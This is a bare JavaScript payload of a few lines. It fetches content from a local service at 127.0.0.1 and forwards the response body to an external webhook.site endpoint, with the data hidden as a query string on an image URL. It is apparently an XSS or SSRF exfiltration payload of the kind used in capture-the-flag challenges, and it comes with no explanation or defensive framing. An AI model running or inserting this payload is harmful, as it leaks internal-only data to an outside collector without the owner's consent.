
fetch("http://127.0.0.1:30106/").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://webhook.site/4d5de934-a8c5-4c46-9e2e-0377f5ba5c76/a.png?data="+data);
})
